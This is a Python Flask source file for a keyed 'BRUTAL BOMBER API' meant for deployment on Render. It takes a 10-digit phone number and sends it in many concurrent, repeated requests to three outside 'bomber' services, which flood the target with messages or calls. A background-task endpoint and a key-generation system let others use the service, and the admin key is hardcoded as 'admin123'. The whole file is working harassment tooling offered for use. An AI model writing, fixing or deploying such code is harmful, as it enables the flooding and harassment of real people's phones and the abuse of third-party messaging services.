# ============================================
# brutal_bomber_api.py
# FIXED FOR PYTHON 3.11+ — Render Deploy Ready
# 3 APIs (Ultra + Part1 + Part2) + Key System
# ============================================

import os
import sys
import time
import secrets
import threading
import importlib
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

# ====== FIX: pkgutil.get_loader REPLACEMENT ======
def get_flask_app():
    """Fix for Python 3.11+ — avoids pkgutil.get_loader"""
    try:
        from flask import Flask, request, jsonify
        return Flask, request, jsonify
    except ImportError:
        # Fallback for older Python
        import flask
        return flask.Flask, flask.request, flask.jsonify

Flask, request, jsonify = get_flask_app()

import requests

app = Flask(__name__)

# ====== KEY SYSTEM ======
DEFAULT_KEY = "admin123"
keys_db = {}

def generate_key(duration_hours=24):
    key = secrets.token_hex(16)
    created = datetime.now()
    expires = created + timedelta(hours=duration_hours)
    keys_db[key] = {
        "created": created.isoformat(),
        "expires": expires.isoformat(),
        "active": True
    }
    return key

def validate_key(key):
    if key == DEFAULT_KEY:
        return True
    if key not in keys_db:
        return False
    if not keys_db[key]["active"]:
        return False
    expires = datetime.fromisoformat(keys_db[key]["expires"])
    if datetime.now() > expires:
        keys_db[key]["active"] = False
        return False
    return True

def expire_key(key):
    if key in keys_db:
        keys_db[key]["active"] = False
        return True
    return False

# ====== 3 APIS ======
THREE_APIS = [
    {
        "name": "Ultra_Bomber",
        "url": "https://ultra-brutal-bomber.onrender.com/bomb",
        "method": "GET",
        "params": {"phone": "{num}"}
    },
    {
        "name": "Part1_Bomber",
        "url": "https://bomber-part-1.onrender.com/bomb",
        "method": "GET",
        "params": {"phone": "{num}"}
    },
    {
        "name": "Part2_Bomber",
        "url": "https://brutal-bomber-part-2.onrender.com/bomb",
        "method": "GET",
        "params": {"phone": "{num}"}
    }
]

# ====== FIXED BOMBER ENGINE (NO INFINITE LOOP) ======
def send_request(api, phone, delay=0.005):
    """Single request — no infinite loop"""
    time.sleep(delay)
    try:
        params = api["params"].copy()
        for k, v in params.items():
            if "{num}" in v:
                params[k] = v.replace("{num}", phone)
        resp = requests.get(api["url"], params=params, timeout=10)
        return resp.status_code == 200
    except:
        return False

def run_bombing(phone, key, cycles=3, threads=50, delay=0.005):
    """Run bombing for limited cycles — no infinite loop"""
    if not validate_key(key):
        return {"status": "error", "message": "Invalid key"}
    
    success = 0
    failed = 0
    
    for cycle in range(cycles):
        # Create list of APIs (multiply for more requests)
        api_list = THREE_APIS * 2  # 6 requests per cycle
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_request, api, phone, delay) for api in api_list]
            for future in as_completed(futures):
                if future.result():
                    success += 1
                else:
                    failed += 1
        
        # Small delay between cycles
        if cycle < cycles - 1:
            time.sleep(1)
    
    return {
        "status": "success",
        "phone": phone,
        "cycles": cycles,
        "successful": success,
        "failed": failed,
        "total": success + failed,
        "total_apis": len(THREE_APIS)
    }

# ====== BACKGROUND TASK STORAGE ======
tasks = {}

# ====== FIXED API ENDPOINTS ======

@app.route('/')
def home():
    return {
        "status": "🔥 BRUTAL BOMBER API 🔥",
        "version": "3.0",
        "python_version": sys.version,
        "apis": [api["name"] for api in THREE_APIS],
        "endpoints": {
            "/bomb": "GET/POST — phone, key, cycles, threads, delay",
            "/keygen": "POST — Generate new API key",
            "/key/expire": "POST — Expire a key",
            "/health": "GET — Health check"
        }
    }

@app.route('/bomb', methods=['GET', 'POST'])
def bomb():
    """Bombing endpoint — returns immediately, runs in background"""
    if request.method == 'GET':
        phone = request.args.get('phone')
        key = request.args.get('key')
        cycles = int(request.args.get('cycles', 3))
        threads = int(request.args.get('threads', 50))
        delay = float(request.args.get('delay', 0.005))
    else:
        data = request.get_json() or {}
        phone = data.get('phone')
        key = data.get('key')
        cycles = data.get('cycles', 3)
        threads = data.get('threads', 50)
        delay = data.get('delay', 0.005)
    
    # Validate
    if not key or not validate_key(key):
        return jsonify({"status": "error", "message": "Invalid or expired key"}), 401
    
    if not phone or len(phone) != 10 or not phone.isdigit():
        return jsonify({"status": "error", "message": "Phone number must be 10 digits"}), 400
    
    # Create task ID
    task_id = f"{phone}_{int(time.time())}"
    
    # Run in background thread
    def run_task():
        result = run_bombing(phone, key, cycles, threads, delay)
        tasks[task_id] = result
    
    thread = threading.Thread(target=run_task)
    thread.daemon = True
    thread.start()
    
    return jsonify({
        "status": "success",
        "message": "Bombing started in background",
        "task_id": task_id,
        "phone": phone,
        "cycles": cycles,
        "apis": len(THREE_APIS)
    })

@app.route('/status/<task_id>', methods=['GET'])
def get_status(task_id):
    """Check bombing status"""
    if task_id in tasks:
        return jsonify(tasks[task_id])
    return jsonify({"status": "pending", "message": "Task not completed yet"})

@app.route('/keygen', methods=['POST'])
def keygen():
    data = request.get_json() or {}
    admin_key = data.get('admin_key')
    duration = int(data.get('duration', 24))
    
    if admin_key != DEFAULT_KEY:
        return jsonify({"status": "error", "message": "Invalid admin key"}), 401
    
    new_key = generate_key(duration)
    return jsonify({
        "status": "success",
        "key": new_key,
        "expires": keys_db[new_key]["expires"],
        "duration": f"{duration} hours"
    })

@app.route('/key/expire', methods=['POST'])
def expire():
    data = request.get_json() or {}
    admin_key = data.get('admin_key')
    key_to_expire = data.get('key')
    
    if admin_key != DEFAULT_KEY:
        return jsonify({"status": "error", "message": "Invalid admin key"}), 401
    
    if not key_to_expire:
        return jsonify({"status": "error", "message": "key required"}), 400
    
    if expire_key(key_to_expire):
        return jsonify({"status": "success", "message": f"Key {key_to_expire} expired"})
    
    return jsonify({"status": "error", "message": "Key not found"}), 404

@app.route('/health')
def health():
    return jsonify({
        "status": "healthy",
        "version": "3.0",
        "python_version": sys.version.split()[0],
        "apis": len(THREE_APIS),
        "active_keys": len([k for k, v in keys_db.items() if v["active"]]),
        "total_keys": len(keys_db)
    })

@app.route('/stats')
def stats():
    return jsonify({
        "total_apis": len(THREE_APIS),
        "apis": [api["name"] for api in THREE_APIS],
        "active_keys": len([k for k, v in keys_db.items() if v["active"]]),
        "total_keys": len(keys_db)
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
